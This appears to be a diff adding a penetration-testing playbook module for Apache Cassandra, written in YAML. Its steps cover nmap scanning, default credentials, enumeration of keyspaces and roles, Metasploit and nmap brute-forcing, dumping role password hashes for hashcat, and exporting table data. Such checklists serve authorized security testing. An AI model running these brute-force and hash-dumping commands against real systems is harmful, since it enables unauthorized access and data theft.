@@ -1,0 +1,60 @@
+module: cassandra
+name: Cassandra (9042 / 9160)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+      - id: connect
+        text: Connect with cqlsh (default creds cassandra/cassandra)
+        commands: |
+          cqlsh $IP $PORT
+          cqlsh $IP $PORT -u cassandra -p cassandra
+
+  - id: enum
+    name: Enumeration
+    steps:
+      - id: keyspaces
+        text: List keyspaces / tables
+        commands: |
+          cqlsh $IP $PORT -u $USER -p $PASS -e "DESCRIBE KEYSPACES;"
+          # then: DESCRIBE KEYSPACE <ks>;  SELECT * FROM <ks>.<table> LIMIT 50;
+      - id: users
+        text: Enumerate roles / users
+        manual: true
+        commands: |
+          # LIST ROLES;   SELECT * FROM system_auth.roles;
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: default
+        text: Try default cassandra/cassandra
+        commands: |
+          nmap -p$PORT --script=cassandra-brute $IP
+      - id: brute
+        text: Brute-force credentials
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/cassandra/cassandra_login; set RHOSTS $IP; run; exit"
+
+  - id: exploit
+    name: Data Extraction
+    steps:
+      - id: dump
+        text: Dump credential hashes / data
+        manual: true
+        commands: |
+          # SELECT role,salted_hash FROM system_auth.roles;  (bcrypt -> hashcat -m 3200)
+          cqlsh $IP $PORT -u $USER -p $PASS -e "SELECT * FROM system_auth.roles;"
+      - id: loot
+        text: Hunt sensitive app data across keyspaces
+        manual: true
+        commands: |
+          # iterate keyspaces/tables; export with COPY <table> TO '$OUT/out.csv';
